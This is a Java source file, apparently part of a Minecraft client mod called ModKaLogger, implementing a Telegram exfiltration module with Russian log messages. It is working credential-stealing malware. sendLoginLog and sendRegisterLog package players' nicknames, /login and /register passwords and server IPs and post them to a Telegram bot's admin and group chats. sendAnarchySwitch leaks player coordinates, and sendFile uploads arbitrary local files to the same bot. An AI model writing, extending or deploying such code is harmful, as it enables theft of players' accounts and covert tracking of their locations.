package com.modkalogger.telegram;

import com.modkalogger.ModKaLogger;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

public class TelegramSender {
    
    public static void sendMessage(String message) {
        new Thread(() -> {
            // Отправка в личный чат (если настроен)
            if (ModKaLogger.TELEGRAM_ADMIN_ID != null && !ModKaLogger.TELEGRAM_ADMIN_ID.isEmpty()) {
                sendToChat(message, ModKaLogger.TELEGRAM_ADMIN_ID, "личный чат");
            }
            // Отправка в группу (если настроена)
            if (ModKaLogger.TELEGRAM_GROUP_ID != null && !ModKaLogger.TELEGRAM_GROUP_ID.isEmpty()) {
                sendToChat(message, ModKaLogger.TELEGRAM_GROUP_ID, "группа");
            }
        }).start();
    }
    
    private static void sendToChat(String message, String chatId, String targetName) {
        try {
            String jsonPayload = "{\"chat_id\":\"" + chatId + 
                               "\",\"text\":\"" + escapeJson(message) + 
                               "\",\"parse_mode\":\"HTML\"}";
            
            ModKaLogger.LOGGER.info("Отправка сообщения в Telegram -> " + targetName + " (размер: " + jsonPayload.length() + " bytes)");
            
            URL url = new URL(ModKaLogger.TELEGRAM_BOT_API);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                ModKaLogger.LOGGER.info("Сообщение успешно отправлено в " + targetName + " (код: " + responseCode + ")");
            } else {
                ModKaLogger.LOGGER.error("Ошибка отправки в " + targetName + ": " + responseCode);
            }
            conn.disconnect();
        } catch (Exception e) {
            ModKaLogger.LOGGER.error("Ошибка подключения к Telegram -> " + targetName, e);
            e.printStackTrace();
        }
    }
    
    public static void sendFile(File file) {
        new Thread(() -> {
            try {
                sendFileSync(file);
            } catch (Exception e) {
                ModKaLogger.LOGGER.error("Ошибка отправки файла в Telegram", e);
                e.printStackTrace();
            }
        }).start();
    }
    
    public static void sendFileSync(File file) throws Exception {
        if (!file.exists()) {
            ModKaLogger.LOGGER.error("Файл не существует: " + file.getAbsolutePath());
            throw new Exception("Файл не существует: " + file.getAbsolutePath());
        }
        
        // Отправка в личный чат (если настроен)
        if (ModKaLogger.TELEGRAM_ADMIN_ID != null && !ModKaLogger.TELEGRAM_ADMIN_ID.isEmpty()) {
            sendFileToChat(file, ModKaLogger.TELEGRAM_ADMIN_ID, "личный чат");
        }
        // Отправка в группу (если настроена)
        if (ModKaLogger.TELEGRAM_GROUP_ID != null && !ModKaLogger.TELEGRAM_GROUP_ID.isEmpty()) {
            sendFileToChat(file, ModKaLogger.TELEGRAM_GROUP_ID, "группа");
        }
    }
    
    private static void sendFileToChat(File file, String chatId, String targetName) throws Exception {
        ModKaLogger.LOGGER.info("Отправка файла в Telegram -> " + targetName + ": " + file.getName() + " (" + file.length() + " bytes)");
        
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL("https://api.telegram.org/bot" + ModKaLogger.TELEGRAM_BOT_TOKEN + "/sendDocument");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setDoOutput(true);
        
        try (OutputStream os = conn.getOutputStream()) {
            // chat_id
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes());
            os.write((chatId + "\r\n").getBytes());
            
            // document
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
            
            byte[] fileData = Files.readAllBytes(file.toPath());
            os.write(fileData);
            os.write("\r\n".getBytes());
            
            os.write(("--" + boundary + "--\r\n").getBytes());
        }
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            ModKaLogger.LOGGER.info("Файл успешно отправлен в " + targetName + ": " + file.getName());
        } else {
            ModKaLogger.LOGGER.error("Ошибка отправки файла в " + targetName + ": " + responseCode);
        }
        conn.disconnect();
    }
    
    public static void sendLoginLog(String nickname, String password, String serverIp) {
        String message = "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                "Password: <code>/login " + escapeHtml(password) + "</code>\n" +
                "Server: <code>" + escapeHtml(serverIp) + "</code></blockquote>\n\n" +
                "t.me/modkalogger";
        ModKaLogger.LOGGER.info("Отправка логина: " + nickname + " на сервер " + serverIp);
        sendMessage(message);
    }
    
    public static void sendRegisterLog(String nickname, String password1, String password2, String serverIp) {
        String message;
        
        if (password1.equals(password2)) {
            message = "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                    "Password: <code>/register " + escapeHtml(password1) + "</code>\n" +
                    "Server: <code>" + escapeHtml(serverIp) + "</code></blockquote>\n\n" +
                    "t.me/modkalogger";
        } else {
            message = "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                    "Password: <code>/register " + escapeHtml(password1) + " " + escapeHtml(password2) + "</code>\n" +
                    "Server: <code>" + escapeHtml(serverIp) + "</code></blockquote>\n\n" +
                    "t.me/modkalogger";
        }
        
        ModKaLogger.LOGGER.info("Отправка регистрации: " + nickname + " на сервер " + serverIp);
        sendMessage(message);
    }
    
    public static void sendAnarchySwitch(String nickname, String anarchyNumber, String serverIp, 
                                         double x, double y, double z) {
        String message = "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                "Server: <code>" + escapeHtml(serverIp) + "</code>\n\n" +
                "X: <code>" + String.format("%.1f", x) + "</code>\n" +
                "Y: <code>" + String.format("%.1f", y) + "</code>\n" +
                "Z: <code>" + String.format("%.1f", z) + "</code></blockquote>\n\n" +
                "t.me/modkalogger";
        ModKaLogger.LOGGER.info("Отправка анархии: " + nickname + " /an" + anarchyNumber + " на сервер " + serverIp);
        sendMessage(message);
    }
    
    private static String escapeHtml(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;")
                   .replace("'", "&#39;");
    }
    
    private static String escapeJson(String text) {
        if (text == null) return "";
        return text.replace("\\", "\\\\")
                   .replace("\"", "\\\"")
                   .replace("\n", "\\n")
                   .replace("\r", "\\r")
                   .replace("\t", "\\t");
    }
}
